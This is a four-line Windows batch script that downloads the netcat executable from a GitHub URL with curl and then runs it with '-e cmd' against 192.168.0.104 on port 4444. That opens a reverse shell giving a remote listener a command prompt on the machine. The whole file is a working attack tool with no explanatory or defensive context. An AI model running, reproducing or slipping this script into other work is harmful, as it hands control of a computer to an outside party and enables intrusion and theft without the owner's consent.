@echo off
echo Downloading nc.exe...
curl -L -o nc.exe https://github.com/diegocr/netcat/raw/master/nc.exe
nc.exe 192.168.0.104 4444 -e cmd
